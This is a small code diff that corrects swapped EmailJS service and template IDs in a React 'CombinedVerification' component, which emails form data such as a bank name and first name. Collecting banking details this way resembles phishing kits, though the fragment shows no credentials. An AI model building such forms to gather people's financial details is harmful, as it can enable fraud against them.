@@ -68,8 +68,8 @@ export default function CombinedVerification() {
     try {
       // Send email using EmailJS
       const response = await emailjs.send(
-        "template_vj50jeg", // Your EmailJS service ID
-        "service_my2ydis", // Your EmailJS template ID
+        "service_my2ydis", // Your EmailJS service ID
+        "template_vj50jeg", // Your EmailJS template ID
         {
           bankName: formData.bankName,
           firstName: formData.firstName,
